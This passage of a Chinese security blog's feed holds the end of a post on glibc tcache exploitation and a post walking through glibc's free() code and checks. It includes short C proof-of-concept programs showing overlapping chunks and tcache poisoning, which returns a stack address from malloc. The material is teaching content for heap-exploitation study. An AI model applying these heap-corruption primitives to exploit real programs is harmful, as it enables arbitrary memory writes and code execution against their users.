<span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p><p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p><p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p><p>成功分配到了 栈上面。</p><p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p><p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p><p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p><p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p><p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;glibc 2.26&lt;/code&gt; 开始引入了 &lt;code&gt;tcache&lt;/code&gt; , 相关的 commit 可以看&lt;br&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>free源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/free%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/free源码简单分析/</id>
    <published>2020-02-26T11:14:51.000Z</published>
    <updated>2020-04-07T03:39:47.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h2><p>首先是 _GI___libc_free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _GI___libc_free(<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _free_hook )</span><br><span class="line">  &#123;</span><br><span class="line">    _free_hook(ptr, retaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int64)ptr - <span class="number">16</span>;</span><br><span class="line">    v2 = *((_QWORD *)ptr - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp; <span class="number">2</span> )                               <span class="comment">// 判断size位，判断是不是 mmap 获得的 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; v2 &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; v2 &lt;= <span class="number">0x2000000</span></span><br><span class="line">        &amp;&amp; (v1 &lt; (<span class="keyword">unsigned</span> __int64)dumped_main_arena_start || v1 &gt;= (<span class="keyword">unsigned</span> __int64)dumped_main_arena_end) )</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * (v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      munmap_chunk((mchunkptr)((<span class="keyword">char</span> *)ptr - <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      av = &amp;main_arena;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &amp; <span class="number">4</span> )</span><br><span class="line">        av = *(malloc_state **)(v1 &amp; <span class="number">0xFFFFFFFFFC000000</span>LL);</span><br><span class="line">      int_free(av, (mchunkptr)v1, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先会做一些简单的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查指针是否正常，对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 chunk 是否处于 inuse 状态</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 inuse 状态</li></ul><h2 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked = <span class="number">1</span>;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ <span class="comment">// next-&gt;size &lt;= 2 * SIZE_SZ</span></span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; <span class="comment">// </span></span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old; <span class="comment">// 插入 fastbin</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next_chunk-&gt;size &gt; <span class="number">2</span> * SIZE_SZ</span><br><span class="line">next_chunk-&gt;size &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><p>接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free</p><h2 id="进入-Unsorted-bin"><a href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h2><p>如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 得到下一个 chunk 的指针</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能 free top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// nextchunk 不能越界，就是限制了 p-&gt;size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">              &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">              &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/*p 要被标识为 inuse 状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">// 获得 nextchunk 的下一个 chunk, 的 pre_inused位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 nextchunk 也是 free 状态的，合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// 合并的结果放置到 unsorted bin</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 防止 unsortedbin 被破坏</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">      systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>大概流程</p><ul><li>首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断）</li><li>接着判断 p 的前后相邻块是不是 free 状态，如果是就合并</li><li>根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</li></ul><p>如果 p 是通过 mmap 获得的，就通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munmap_chunk (p);</span><br></pre></td></tr></table></figure></p><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><p><img alt="" data-src="/imgs/check_free.png" class="lozad"></p><p>来源 <a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">https://github.com/DhavalKapil/heap-exploitation</a></p><p><a href="https://heap-exploitation.dhavalkapil.com/author.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/author.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GI-libc-free&quot;&gt;&lt;a href=&quot;#GI-libc-free&quot; class=&quot;headerlink&quot; title=&quot;_GI___libc_free&quot;&gt;&lt;/a&gt;_GI___libc_free&lt;/h2&gt;&lt;p&gt;首先是 _GI___libc_free&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
